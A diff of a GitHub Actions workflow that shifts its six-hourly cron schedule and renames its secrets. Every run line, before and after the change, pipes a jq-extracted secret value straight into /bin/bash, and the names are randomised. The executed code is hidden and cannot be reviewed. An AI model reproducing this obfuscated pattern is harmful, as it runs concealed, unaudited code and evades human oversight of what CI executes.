@@ -1,10 +1,8 @@
 name: zhongquanhuohuang
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 1/6 * * *'
-
+    - cron: '8 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhongquanhuohuang
         env:
-          gexht0: ${{ secrets.gexht0 }}
+          gsxl42023: ${{ secrets.gsxl42023 }}
         run: |
-          echo $gexht0 | jq -r .bzwxx90073 | /bin/bash
-          echo $unl7234 | jq -r .qu01532 | /bin/bash
-          echo $eqp70558 | jq -r .ojoi497 | /bin/bash
-          echo $uc088 | jq -r .owtjc0833 | /bin/bash
-          echo $nskv7208 | jq -r .cwgtk568 | /bin/bash
-          echo $yhih9792 | jq -r .u1 | /bin/bash
-          echo $uter713 | jq -r .wtn0 | /bin/bash
-          echo $y680 | jq -r .kgfk2 | /bin/bash
-          echo $cyshf9 | jq -r .siwi97189 | /bin/bash
-          echo $gr21309 | jq -r .mmmr7 | /bin/bash
-          echo $agoxf9 | jq -r .af5256 | /bin/bash
-          echo $zxr5964 | jq -r .if33499 | /bin/bash
+          echo $gsxl42023 | jq -r .k462 | /bin/bash
+          echo $jwhnw4594 | jq -r .ykkb31 | /bin/bash
+          echo $kikf14655 | jq -r .rkwy516 | /bin/bash
+          echo $nzb0 | jq -r .eis7961 | /bin/bash
+          echo $c74 | jq -r .opr41 | /bin/bash
+          echo $ekrh920 | jq -r .hmw2685 | /bin/bash
+          echo $lv925 | jq -r .vrhlc492 | /bin/bash
+          echo $ou247 | jq -r .csb3333 | /bin/bash
 
